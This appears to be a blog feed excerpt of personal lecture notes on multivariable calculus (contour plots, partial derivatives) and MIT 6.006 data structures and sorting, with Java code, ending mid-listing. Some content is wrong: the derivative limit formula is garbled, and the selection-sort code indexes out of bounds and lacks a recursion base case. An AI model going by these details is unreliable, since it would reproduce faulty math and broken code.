Let&rsquo;s now see what  a function of two variables looks like:
</p>
\begin{equation}
f:\mathbb{R}^2\to \mathbb{R}: (x,y)\to f(x,y)
\end{equation}
<p>
It is just like any other function we already know (It has a domain of
definition, certain sets of input for which it may not be defined)!
</p>

<p>
Some examples of such functions are:
</p>

\begin{align*}
f(x,y)&=x^2+y^2\\
f(x,y)&=\sqrt{y}\\
f(x,y)&= \frac{1}{x+y}
\end{align*}
</div>
</div>
<div id="outline-container-orged8c8b2" class="outline-2">
<h2 id="orged8c8b2"><span class="section-number-2">2.</span> <a href="#orged8c8b2">Visualizing functions</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Truth be told, while functions with two variables are slightly more difficult
than our <i>common</i> functions in visualization, they can be easily perceived. That
changes when we talk about functions of more variables making it increasingly
more difficult for us to visualize them.<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
</p>

<p>
Just like we got used to seeing \(y=f(x)\), it is easy, especially if you sit in
front of a computer, to plot a function of two variables by using: \(z=f(x,y)\).
</p>

<p>
Some examples of such plots:
</p>
<ol class="org-ol">
<li>\(f(x,y)=-y\)
<img src="posts/lectures/mit/1802/../../../images/1802/1802_8_-y3d.png" alt="1802_8_-y3d.png"></li>
<li>\(f(x,y) = 1-x^2-y^2\)
<img src="posts/lectures/mit/1802/../../../images/1802/1802_8_1.png" alt="1802_8_1.png"></li>
<li>\(f(x,y)=y^2-x^2\)
<img src="posts/lectures/mit/1802/../../../images/1802/1802_8_y2-x23d.png" alt="1802_8_y2-x23d.png">
 The first time we see a <b>saddle point</b>, in which we will be interested in
the near future.</li>
</ol>
</div>
<div id="outline-container-org0168693" class="outline-3">
<h3 id="org0168693"><span class="section-number-3">2.1.</span> <a href="#org0168693">Understanding a three-dimensional plot</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
It is not necessary however, to use a computer to generate such a plot.
Obviously, it will make our lives significantly easier <b>and</b> will ensure a good
result, one that will be presentable and clear to others as well, but it is not
needed.
</p>

<p>
Even though it gets increasingly more tiring for more complex functions a good
approach to designing the three dimensional plot of a given function \(f\), is
taking the common points that it has with different planes ( such as the
\(xy,xz,yz\) planes )<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>
</p>
</div>
</div>
<div id="outline-container-orgc5e31f8" class="outline-3">
<h3 id="orgc5e31f8"><span class="section-number-3">2.2.</span> <a href="#orgc5e31f8">Contour plots:</a></h3>
<div class="outline-text-3" id="text-2-2">
<p>
So far, following the simple path, we built upon what we already knew and
managed to describe <i>every</i> function of two variables in the three dimensional
space. Now let&rsquo;s take a step back.
</p>

<p>
Think of the difficulty which drawing 3d plots presents. We can not reliably
represent complex 3d shapes on paper. Most of the times it will be extremely
difficult for the reader to understand what exactly we&rsquo;re plotting. That&rsquo;s where
contour plots come in. They are a collection of curves in the form of \(f(x,y) =
c\in \mathbb{R}\).
</p>

<p>
An easy way to understand what contour plots are is by looking at an ordinary
map ( such as the one below ), and look how height is embedded in it.
Interesting is not it<sup><a id="fnr.3" class="footref" href="#fn.3" role="doc-backlink">3</a></sup>?
</p>


<div id="orgbc0da89" class="figure">
<p><img src="https://www.acsu.buffalo.edu/~dbertuca/maps/cat/contours-spot.jpg" alt="contours-spot.jpg">
</p>
</div>
</div>
<div id="outline-container-org5826aa1" class="outline-4">
<h4 id="org5826aa1"><span class="section-number-4">2.2.1.</span> <a href="#org5826aa1">Octave code for simple contour plots:</a></h4>
<div class="outline-text-4" id="text-2-2-1">
<div class="org-src-container">
<pre class="src src-octave">[x<span class="org-builtin">,</span>y] <span class="org-builtin">=</span> meshgrid(<span class="org-builtin">-</span>10<span class="org-builtin">:</span>0.1<span class="org-builtin">:</span>10<span class="org-builtin">,-</span>10<span class="org-builtin">:</span>01.<span class="org-builtin">:</span>10)
contour(x<span class="org-builtin">.^</span>2<span class="org-builtin">+</span>y<span class="org-builtin">.^</span>2)
</pre>
</div>

<p>
That ( with the slight change of using the <code>contourf</code> instead of the <code>contour</code>
func ) gives us:
<img src="posts/lectures/mit/1802/../../../images/1802/1802_8_sampleContour.png" alt="1802_8_sampleContour.png">
</p>
</div>
</div>
<div id="outline-container-org70e70e0" class="outline-4">
<h4 id="org70e70e0"><span class="section-number-4">2.2.2.</span> <a href="#org70e70e0">Contour plots applications</a></h4>
<div class="outline-text-4" id="text-2-2-2">
<p>
Just like we have already seen, contour plots are often met in mapsThere are many applications in maps, being able to get information on the
location generally:
</p>
<ul class="org-ul">
<li>Heat maps</li>
<li>Height maps</li>
<li>Population maps</li>
</ul>
</div>
</div>
<div id="outline-container-orgc80e91f" class="outline-4">
<h4 id="orgc80e91f"><span class="section-number-4">2.2.3.</span> <a href="#orgc80e91f">Examples</a></h4>
<div class="outline-text-4" id="text-2-2-3">
<p>
Linking to the previous examples, their contour plots:
</p>
<ol class="org-ol">
<li>\(f(x,y) = -y\)
<img src="posts/lectures/mit/1802/../../../images/1802/1802_8_-yContour.png" alt="1802_8_-yContour.png"></li>
<li>\(f(x,y)= 1-x^2-y^2\)
<img src="posts/lectures/mit/1802/../../../images/1802/1802_8_2.png" alt="1802_8_2.png"></li>
<li>\(f(x,y)=x^2-y^2\)
<img src="posts/lectures/mit/1802/../../../images/1802/1802_8_3.png" alt="1802_8_3.png"></li>
</ol>
</div>
</div>
</div>
</div>
<div id="outline-container-orgfec7800" class="outline-2">
<h2 id="orgfec7800"><span class="section-number-2">3.</span> <a href="#orgfec7800">Partial Derivatives</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Now think of a random contour plot. Just by looking at it we can understand in
just one look how moving on the plane is going to affect our function&rsquo;s values.
More specifically, we can see that if we move <b>on</b> a contour plot, our
function&rsquo;s value will remain constant, while in any other case it will increase
or decrease. We can also see ( if we are careful enough ) in which direction the
function increases at a maximum rate.
</p>

<p>
Thus, we can intuitively understand the rate of change, which we know as the
derivative of a function:
</p>
</div>
<div id="outline-container-org3e8a66d" class="outline-3">
<h3 id="org3e8a66d"><span class="section-number-3">3.1.</span> <a href="#org3e8a66d">Remember</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
For a function of one variable the derivative is given as:
</p>
\begin{equation}
f'(x) = \frac{d{f}}{d{x}} = \lim_{\Delta{x}\to 0 }\frac{f(x+\Delta f(x)}{\Delta x}
\end{equation}
</div>
<div id="outline-container-org334e090" class="outline-4">
<h4 id="org334e090"><span class="section-number-4">3.1.1.</span> <a href="#org334e090">Differentiability</a></h4>
<div class="outline-text-4" id="text-3-1-1">
<p>
Obviously, we can not compute the derivative of each and every function. There
are some functions for which the derivative does not exist and that remains true
for functions of more variables. It is good to remember it, yet outside the
scope of this course.
</p>
</div>
</div>
<div id="outline-container-org7267f3b" class="outline-4">
<h4 id="org7267f3b"><span class="section-number-4">3.1.2.</span> <a href="#org7267f3b">Approximation formula</a></h4>
<div class="outline-text-4" id="text-3-1-2">
<p>
If we know the value of \(f,f'\) at a point \(x_0\) we can approximate the value of
\(f\) at \(x\), provided that \(x\) is <i>close</i> to \(x_0\) using the following formula:
</p>
\begin{equation}
f(x)\approx  f(x_0) + f'(x_0)(x-x_0)
\end{equation}
</div>
</div>
</div>
<div id="outline-container-org83c56b4" class="outline-3">
<h3 id="org83c56b4"><span class="section-number-3">3.2.</span> <a href="#org83c56b4">What changes</a></h3>
<div class="outline-text-3" id="text-3-2">
<p>
The difficulty presented in functions of more variables is that we can change
more than one variable and we can also change both of them in <b>UNLIMITED</b> combinations.
</p>

<p>
We, then, create a new form of a derivative, the <b>partial derivative</b>, which
shows us how \(f\) would change should we modify only a specific parameter, such
as \(x\) or \(y\):
</p>
\begin{equation}
\frac{\partial{f}}{\partial{x}} = \lim_{\Delta x \to 0} \frac{f(x_0+\Delta x,y_0)-f(x_0,y_0)}{\Delta x}
\end{equation}
</div>
<div id="outline-container-org9802b52" class="outline-4">
<h4 id="org9802b52"><span class="section-number-4">3.2.1.</span> <a href="#org9802b52">Geometric implications</a></h4>
<div class="outline-text-4" id="text-3-2-1">
<p>
It is interesting noting down that partial derivatives can be easily found in 3d
plots as well. Let&rsquo;s pick one of the previous 3d plots and focus on calculating
the partial derivative \(\frac{\partial{f}}{\partial{x}}\). To do that we only
need to follow this algorithm:
</p>
<ol class="org-ol">
<li>Given a 3d plot of our function</li>
<li>Draw a plane in the form of \(y = y_{0}\in \mathbb{R}\)</li>
<li>Focus on their intersection
<ol class="org-ol">
<li>Think of the plane of step 2 as a two dimensional plane and the points
where it intersects \(f\) as the plot of a single variable function \(g\)</li>
<li>In this two-dimensional graph we see that \(y = g(x)\)</li>
<li>For every \(x\in D_g \subset \mathbb{R}\) it is true that \(\frac{d{g}}{d{x}}
      = \frac{\partial{f}}{\partial{x}} (x,y_0)\)</li>
</ol></li>
</ol>
</div>
</div>
<div id="outline-container-org008d7b7" class="outline-4">
<h4 id="org008d7b7"><span class="section-number-4">3.2.2.</span> <a href="#org008d7b7">Computing partial derivatives</a></h4>
<div class="outline-text-4" id="text-3-2-2">
<p>
Just like normal derivatives we won&rsquo;t rely on limits to compute them. The rules
we know are applicable to partial derivatives as well, we just need to slightly
change them for a multi-dimensional space.
</p>

<p>
Using what we already know we can compute a partial derivative by considering
every other variable as a constant. An example follows:
</p>
\begin{align*}
f(x,y) &= x + y\\
\frac{\partial{f}}{\partial{x}} &= \frac{\partial{(x+y)}}{\partial{x}} = \frac{d{x+c}}{d{x}} = 1
\end{align*}
</div>
</div>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Of course, one could argue that with the help of computers we could
implement a plotting solution for functions with 3 variables by including the
<i>time</i> factor there. It certainly seems like a good idea to try.
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Afterall, this is how the computer draws the graphs. We may not have the
raw computational power but&#x2026; we know the algorithm
</p></div></div>

<div class="footdef"><sup><a id="fn.3" class="footnum" href="#fnr.3" role="doc-backlink">3</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Think of it like that: \(height = f(x,y)\), which essentially translates
that every contour plot on the map shows a level of constant height: \(height = c
\in \mathbb{R}\)
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>6.006 Lec 2: Data Structures and Dynamic Arrays</title>
<link>posts/lectures/mit/6006/6.006-lec-2-data-structures-and-dynamic-arrays.html</link>
<pubDate>Wed, 16 Feb 2022 00:00:00 +0200</pubDate>
<guid>posts/lectures/mit/6006/6.006-lec-2-data-structures-and-dynamic-arrays.html</guid>
<description>
<![CDATA[<div id="outline-container-org6c09801" class="outline-2">
<h2 id="org6c09801"><span class="section-number-2">1.</span> <a href="#org6c09801">Difference between an interface and a data structure</a></h2>
<div class="outline-text-2" id="text-1">
<p>
The interface can also be called <i>ADT or API</i>.
</p>

<p>
The interface, often called <i>ADT or API</i>, offers the general specifications on
solving the problem; it describes what operations the data structure must
perform and what they will be <i>achieving</i> while the data structures is the
<b>actual</b> implementation of these functions. It consists of all the commands
(algorithm), describing how the interface operations will be implemented and
function.
</p>
</div>
<div id="outline-container-org509447c" class="outline-3">
<h3 id="org509447c"><span class="section-number-3">1.1.</span> <a href="#org509447c">The main interfaces</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
There are two main interfaces:
</p>
<ul class="org-ul">
<li>set</li>
<li>sequence</li>
</ul>
</div>
</div>
<div id="outline-container-org45fd50f" class="outline-3">
<h3 id="org45fd50f"><span class="section-number-3">1.2.</span> <a href="#org45fd50f">DS approaches</a></h3>
<div class="outline-text-3" id="text-1-2">
<p>
Additionally there are two schools of thought:
</p>
<ol class="org-ol">
<li><a href="#orgab8c088"><i>static</i> arrays</a>
Their size is predefined and difficult to change</li>
<li><a href="#orgf5c2976">dynamic structures</a>
Focusing on variable length and easy addition/deletion operations.</li>
</ol>

<p>
Now, we will combine these two together, focusing on sequences.
</p>
</div>
</div>
</div>
<div id="outline-container-orgab8c088" class="outline-2">
<h2 id="orgab8c088"><span class="section-number-2">2.</span> <a href="#orgab8c088">Analyzing static sequences</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Static sequences are to be used when dealing with data in which the order is
important, however the volume of it does not change often.
</p>
</div>
<div id="outline-container-orgf786688" class="outline-3">
<h3 id="orgf786688"><span class="section-number-3">2.1.</span> <a href="#orgf786688">Interface functions</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
<i>The methods that static data structures need to implement efficiently</i>
</p>
<ul class="org-ul">
<li><code>build()</code>, O(n)
The creation of a new array, runs in linear time, due to the fact that the
computer needs to <code>malloc()</code> space for n elements and initialize <b>all</b> of
their elements</li>
<li><code>length()</code>, O(1)
Returns n, no matter how many elements are used inside the array</li>
<li><code>iter_seq()</code>, O(n)
Visit every element from the beginning of the array to the end of the array</li>
<li><code>get_at(i)</code>, O(1)</li>
<li><code>set_at(i,x)</code>, O(1)
These two functions take constant time as explained in <a href="#orgf465e9e">the word RAM model</a></li>
</ul>

<p>
The natural solution to this <i>problem</i> is the static array.
</p>
</div>
</div>
<div id="outline-container-orgf465e9e" class="outline-3">
<h3 id="orgf465e9e"><span class="section-number-3">2.2.</span> <a href="#orgf465e9e">Word RAM model of computation</a></h3>
<div class="outline-text-3" id="text-2-2">
<p>
RAM stands out for Random Access Memory, meaning that the computer (CPU) can
access every element in it in constant time. This differentiates data structures
that follow this model to ones that focus on other operations.
</p>

<p>
Practically, this means that all items are stored in a continuous location in
memory, where the ith field  consists of x<sub>i</sub>
</p>
<div class="source" id="org7f6a218">
<p>
x[i] = x<sub>i</sub>
</p>

</div>
</div>
</div>
<div id="outline-container-orgc5706a2" class="outline-3">
<h3 id="orgc5706a2"><span class="section-number-3">2.3.</span> <a href="#orgc5706a2">Reality and memory</a></h3>
<div class="outline-text-3" id="text-2-3">
<p>
<i>I must have misunderstood something here, cause I can not explain it clearly</i>
</p>

<p>
This is more of a <i>theoretical</i> warning at this point but, in order for the
static data structures to be implemented it is crucial that the memory increases
at least as fast as the \(\lg{n}\). Meaning that if you have less space than the
\(\lg{n}\) you can not store all the values that you want, therefore you can not
use the data structure.
</p>
</div>
</div>
</div>
<div id="outline-container-orgf5c2976" class="outline-2">
<h2 id="orgf5c2976"><span class="section-number-2">3.</span> <a href="#orgf5c2976">Analyzing dynamic sequences</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Dynamic sequences are to be used when we care more about quick insertion and
sorting and not so much about random access speeds
</p>
</div>
<div id="outline-container-orgf53cbf9" class="outline-3">
<h3 id="orgf53cbf9"><span class="section-number-3">3.1.</span> <a href="#orgf53cbf9">Interface functions</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
Analyzing the previous statement a little bit more, we use dynamic sequences
when we find ourselves dealing with the following operations<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>:
</p>
<ul class="org-ul">
<li><code>insert/delete_first(i,x)</code>, O(1)
We do not need to allocate more space <b>and</b> copy every element in our array to
another location in memory, like in ds, but we just need to create a new node
make it point to <code>head</code> and set it up as the new head. Thus, constant running
time.</li>
<li><code>insert/delete_last()</code>, O(n) or O(1)
Normaly O(n), due to the fact that you need to follow the pointers of each
node in the list to reach the last node <span class="underline">but</span> O(1) is achievable through <i>data
structure augmentation</i>; inserting a new field for our data structure ( a
pointer to the <code>tail</code> node ), to have instant access to the last element.</li>
<li><code>insert_at(i,x),delete_at(i)</code>, O(n)
Even though it takes 0(1) when you have reached the previous node, you can not
perform the operation at 0(1), because you need to iterate through (worst case
scenario) the entire array</li>
</ul>
</div>
</div>
<div id="outline-container-orgfb02009" class="outline-3">
<h3 id="orgfb02009"><span class="section-number-3">3.2.</span> <a href="#orgfb02009">Linked List</a></h3>
<div class="outline-text-3" id="text-3-2">
<p>
The linked list is a data structure based on the Dynamic Sequence ADT. It is a
sequence of nodes, each one with a <code>value</code> and a <code>next</code> field, pointing to the
next node.
</p>

<p>
Unlike arrays, linked lists are not stored in a consecutive chunk of memory;
they are found in random positions in ram. This is the reason why you need
pointers in each node, and why RAM operations do not work efficiently
</p>
</div>
</div>
</div>
<div id="outline-container-org387a905" class="outline-2">
<h2 id="org387a905"><span class="section-number-2">4.</span> <a href="#org387a905">Dynamic arrays</a></h2>
<div class="outline-text-2" id="text-4">
<p>
<i>In Python: lists</i>
</p>

<p>
Let&rsquo;s try to create an improved data structure, kind of combining dynamic and
static data structures to get the best out of both worlds.
</p>

<p>
The main constraint that we have with simple arrays, is that for every time that
you want to add an element you have to <b>resize the whole array</b>. That translates
into allocating a n+1 chunk of memory, copying all of the arrays elements and
then adding the new one. To address that, we could create a larger array of size
<i>rougly</i> n. Then, whenever it gets big enough, resize it but not by expanding it
by a constant. Instead, by doubling (multiplying by \(c>1\)) the existing size.
</p>


<p>
This simple change would lead to:
<code>insert_last()</code>: O(n)-&gt;O(1) <sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>
It actually is not <b>always</b> correct, but most of the time. There will be times
when the size of the array will no longer suffice and it will have to resize
</p>
<ul class="org-ul">
<li>Fewer <code>malloc</code> calls and copying values around in memory, thus increased performance.</li>
<li>To visualize, think of performing n <code>insert_last()</code> in a row and compare the
efficiency of static array to dynamic array</li>
</ul>
</div>
</div>
<div id="outline-container-org62efd15" class="outline-2">
<h2 id="org62efd15"><span class="section-number-2">5.</span> <a href="#org62efd15">Summary: Comparing operations</a></h2>
<div class="outline-text-2" id="text-5">
<table>


<colgroup>
<col  class="org-left">

<col  class="org-right">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">operation</th>
<th scope="col" class="org-right">static array</th>
<th scope="col" class="org-left">linked list</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">insert/delete<sub>at</sub></td>
<td class="org-right">0(n)</td>
<td class="org-left">0(1)</td>
</tr>

<tr>
<td class="org-left">get/set<sub>at</sub></td>
<td class="org-right">0(1)</td>
<td class="org-left">0(n)</td>
</tr>

<tr>
<td class="org-left">get/set<sub>last</sub></td>
<td class="org-right">&#xa0;</td>
<td class="org-left">0(n)/O(1)</td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
We can always use the static functions as well, yet not so efficiently
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
We use amortization: operation takes T(n) amortized time if any k operations take \(\geq k T(n)\)
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>6.006 Lec 3: Sets and Sorting</title>
<link>posts/lectures/mit/6006/6.006-lec-3-sorting.html</link>
<pubDate>Thu, 17 Feb 2022 00:00:00 +0200</pubDate>
<guid>posts/lectures/mit/6006/6.006-lec-3-sorting.html</guid>
<description>
<![CDATA[<div id="outline-container-org7a6d8b9" class="outline-2">
<h2 id="org7a6d8b9"><span class="section-number-2">1.</span> <a href="#org7a6d8b9">Lecture details:</a></h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>Instructor: Justin Solomon</li>
<li>Link: <a href="https://www.youtube.com/watch?v=oS9aPzUNG-s&amp;list=PLUl4u3cNGP63EdVPNLG3ToM6LaEUuStEY&amp;index=4">YouTube Lecture</a></li>
</ul>

<p>
<i>Note to reader:</i> The 6.006 course is, in fact, based on the Python language.
However, due to the fact that the Data Structures course in my university uses
Java, all the code snippets here will be written in Java.
</p>
</div>
</div>
<div id="outline-container-orga4013e5" class="outline-2">
<h2 id="orga4013e5"><span class="section-number-2">2.</span> <a href="#orga4013e5">The set interface</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Our interface is a container, hosting items and associating them with key
values. The functions that we want the set implementation to perform are:
</p>
<ul class="org-ul">
<li><code>build(X)</code>
Given another structure <code>X</code>, through which we can move (and retrieve data),
create a set and fill it with data from <code>X</code></li>
<li><code>len()</code>
Return the size of the <code>set</code>, how many elements are in it.</li>
<li><code>find(k)</code>
Search using the key <code>k</code></li>
<li><code>insert(x)</code>
Add the element <code>x</code> <sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup></li>
<li><code>delete(k)</code>
Find the element with key <code>k</code> and then remove it.</li>
<li><code>iter_ord()</code>
Return every item in the store, in some order</li>
<li><code>find_min(),find_max()</code>
Return the stored item with the smaller and largest key respectively</li>
<li><code>find_next(k),find_prev(k)</code>
Given a key <code>k</code> , return the item with the key <code>K</code> that is the <i>immediate</i>
next or previous respectively</li>
</ul>
</div>
</div>
<div id="outline-container-org40b0dce" class="outline-2">
<h2 id="org40b0dce"><span class="section-number-2">3.</span> <a href="#org40b0dce">Understanding and implementing</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Now that we have outlined the set interface, let&rsquo;s check possible implementations
</p>
</div>
<div id="outline-container-orgbdd2b8d" class="outline-3">
<h3 id="orgbdd2b8d"><span class="section-number-3">3.1.</span> <a href="#orgbdd2b8d">Using an unordered array</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
This is a <i>generally</i> poorly functioning implementation of the set ADT.
</p>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">operation</th>
<th scope="col" class="org-left">Analysis</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">build(X)</td>
<td class="org-left">n</td>
</tr>

<tr>
<td class="org-left">len()</td>
<td class="org-left">1</td>
</tr>

<tr>
<td class="org-left">find(k)</td>
<td class="org-left">n</td>
</tr>

<tr>
<td class="org-left">insert(x)</td>
<td class="org-left">n</td>
</tr>

<tr>
<td class="org-left">delete(k)</td>
<td class="org-left">n</td>
</tr>

<tr>
<td class="org-left">find<sub>min</sub>/max()</td>
<td class="org-left">n</td>
</tr>

<tr>
<td class="org-left">itr<sub>ord</sub>()</td>
<td class="org-left">n</td>
</tr>

<tr>
<td class="org-left">find<sub>next</sub>/prev(k)</td>
<td class="org-left">m</td>
</tr>
</tbody>
</table>

<p>
Essentially, what we are doing in this implementation is to allocate space for
an array of size <code>n</code>, add elements in it with no particular order and in case of
insertion/deletion, as it happens in static arrays, one needs to allocate space
<code>n+1</code> or <code>n-1</code>, and then copy the array, making insertions and deletions too
costly.
</p>
</div>
</div>
<div id="outline-container-org95873bd" class="outline-3">
<h3 id="org95873bd"><span class="section-number-3">3.2.</span> <a href="#org95873bd">Using an sorted array</a></h3>
<div class="outline-text-3" id="text-3-2">
<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">operation</th>
<th scope="col" class="org-left">analysis</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">find(k)</td>
<td class="org-left">\(\lg{n}\)</td>
</tr>
</tbody>
</table>

<p>
What if we want to have quicker find though? If we do not care about the initial
build efficiency but heavily utilize the <code>find(k)</code> function one can use the
sorted array implementation.
</p>

<p>
What changes is that during <code>build(X)</code>, the given input is first sorted by key
and then stored, in that order, in the static array. That enables us to use
binary search to find the desired key reducing the <code>find(k)</code> complexity from
\(O(n)\) to \(O(\lg{n})\)
</p>
</div>
</div>
</div>
<div id="outline-container-org0ddec23" class="outline-2">
<h2 id="org0ddec23"><span class="section-number-2">4.</span> <a href="#org0ddec23">Sorting</a></h2>
<div class="outline-text-2" id="text-4">
<p>
In order to have a sorted array, we need to study which algorithms will give us
one:
</p>
</div>
<div id="outline-container-org022e58d" class="outline-3">
<h3 id="org022e58d"><span class="section-number-3">4.1.</span> <a href="#org022e58d">Basic vocabulary</a></h3>
<div class="outline-text-3" id="text-4-1">
</div>
<div id="outline-container-org9f9ba69" class="outline-4">
<h4 id="org9f9ba69"><span class="section-number-4">4.1.1.</span> <a href="#org9f9ba69">Destructive</a></h4>
<div class="outline-text-4" id="text-4-1-1">
<p>
An algorithm is called destructive when it operates on the input array. More
specifically, it <i>destroys</i> the input unsorted array, overwriting it with its
sorted version
</p>
</div>
</div>
<div id="outline-container-orgcc81b0a" class="outline-4">
<h4 id="orgcc81b0a"><span class="section-number-4">4.1.2.</span> <a href="#orgcc81b0a">In place</a></h4>
<div class="outline-text-4" id="text-4-1-2">
<p>
An algorith is called <span class="underline">in place</span> when, being a destructive algorithm, it uses
constant extra space in memory (\(O(1)\)).
</p>
</div>
</div>
</div>
<div id="outline-container-org094a4d5" class="outline-3">
<h3 id="org094a4d5"><span class="section-number-3">4.2.</span> <a href="#org094a4d5">Algorithms</a></h3>
<div class="outline-text-3" id="text-4-2">
</div>
<div id="outline-container-org526ceec" class="outline-4">
<h4 id="org526ceec"><span class="section-number-4">4.2.1.</span> <a href="#org526ceec">Permutation sort</a></h4>
<div class="outline-text-4" id="text-4-2-1">
<p>
<i>Analysis</i>:  We have \(\Omega(n!n)\)<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>
</p>
<ol class="org-ol">
<li>Enumerate perms \(\Omega(n!)\)</li>
<li>Check (for every perm) if the permutation is sorted \(O(n)\)</li>
</ol>
</div>
</div>
<div id="outline-container-orgf133f46" class="outline-4">
<h4 id="orgf133f46"><span class="section-number-4">4.2.2.</span> <a href="#orgf133f46">Selection sort</a></h4>
<div class="outline-text-4" id="text-4-2-2">
<p>
<i>Analysis</i>: \(O(n^{2})\)
</p>

<p>
There are two ( obviously, could be more than just 2 ), ways to implement
selection sort. A recursive one, useful to perform induction and mathematical
analysis, and one, much simpler to implement, using just for loops.
</p>

<ol class="org-ol">
<li>Find the largest item in 1-i</li>
<li>Swap it with the item at the \(i^{th}\) position</li>
<li>Reduce i by one</li>
<li>Go to 1</li>
</ol>

<p>
This is, following the definitions above, an <i>in place</i> algorithm
</p>
</div>
<ol class="org-ol">
<li><a id="orgf89defb"></a><a href="#orgf89defb">Recursive</a><br>
<div class="outline-text-5" id="text-4-2-2-1">
<div class="org-src-container">
<pre class="src src-java"><span class="org-type">void</span> <span class="org-function-name">selectionSort</span>(<span class="org-type">int</span>[] <span class="org-variable-name">myArray</span>, <span class="org-type">int</span> <span class="org-variable-name">lastItem</span>)
{
    <span class="org-comment-delimiter">// </span><span class="org-comment">Initialize the largestInd to the first entry</span>
    <span class="org-comment-delimiter">// </span><span class="org-comment">because it can only be it, or one of the following entries</span>
    <span class="org-type">int</span> <span class="org-variable-name">largestInd</span> = 0;

    <span class="org-comment-delimiter">// </span><span class="org-comment">Find the largest</span>
    <span class="org-keyword">for</span> ( <span class="org-type">int</span> <span class="org-variable-name">i</span> = 1; i &lt; lastItem; i++ )
       <span class="org-keyword">if</span> ( myArray[i] &gt; myArray[largestInd] )
            largestInd = i;

    <span class="org-comment-delimiter">// </span><span class="org-comment">Perform the swap</span>
    <span class="org-type">int</span> <span class="org-variable-name">temp</span> = myArray[lastItem];
    myArray[lastItem] = myArray[largestInd];
    myArray[largestInd] = temp;

    <span class="org-comment-delimiter">// </span><span class="org-comment">At this point every element after the ith element is sorted</span>
    selectionSort(myArray, lastItem-1)
}
</pre>
</div>
</div>
</li>
<li><a id="org21e81d8"></a><a href="#org21e81d8">Simple Implementation</a><br>
<div class="outline-text-5" id="text-4-2-2-2">
<div class="org-src-container">
<pre class="src src-java"><span class="org-type">void</span> <span class="org-function-name">selectionSort</span>(<span class="org-type">int</span>[] <span class="org-variable-name">myArray</span>)
{
    <span class="org-comment-delimiter">// </span><span class="org-comment">Declare it here so that we do not initialize n temporary variables</span>
    <span class="org-type">int</span> <span class="org-variable-name">largestInd</span>;
    <span class="org-comment-delimiter">// </span><span class="org-comment">Reduce the size of the unsorted array by one with each repetition</span>
    <span class="org-comment-delimiter">// </span><span class="org-comment">The unsorted array at any given moment in time is 1-lastItem</span>
    <span class="org-keyword">for</span> ( <span class="org-type">int</span> <span class="org-variable-name">lastItem</span> = myArray.length; lastItem &gt; 0; lastItem-- )
    {
        <span class="org-comment-delimiter">// </span><span class="org-comment">Initialize the largestInd to the first entry</span>
        <span class="org-comment-delimiter">// </span><span class="org-comment">because it can only be it, or one of the following entries</span>
        largestInd = 0;

        <span class="org-comment-delimiter">// </span><span class="org-comment">Find the largest</span>
        <span class="org-keyword">for</span> ( <span class="org-type">int</span> <span class="org-variable-name">i</span> = 1; i &lt; lastItem; i++ )
        <span class="org-keyword">if</span> ( myArray[i] &gt; myArray[largestInd] )
                largestInd = i;
        <span class="org-comment-delimiter">// </span><span class="org-comment">Perform the swap</span>
        <span class="org-type">int</span> <span class="org-variable-name">temp</span> = myArray[lastItem];
        myArray[lastItem] = myArray[largestInd];
        myArray[largestInd] = temp;
    }
}
</pre>
</div>
</div>
</li>
</ol>
</div>
<div id="outline-container-org042b90a" class="outline-4">
<h4 id="org042b90a"><span class="section-number-4">4.2.3.</span> <a href="#org042b90a">Insertion sort</a></h4>
<div class="outline-text-4" id="text-4-2-3">
<p>
<i>Analysis</i>: \(O(n^{2})\)
</p>

<p>
Insertion sort is similar to selection sort, with the main difference being that
in insertion sort you work from beginning to the end while in selection sort you
follow the opposite route.
</p>

<p>
You start with the first element in the array, because, by definition, an array
with a single element is sorted. Then for each element in the array you <span class="underline">insert</span>
it, swapping every element larger than it.
</p>
<ol class="org-ol">
<li></li>
</ol>
<div class="org-src-container">
<pre class="src src-java"><span class="org-type">void</span> <span class="org-function-name">insertionSort</span>(<span class="org-type">int</span>[] <span class="org-variable-name">myArray</span>)
{
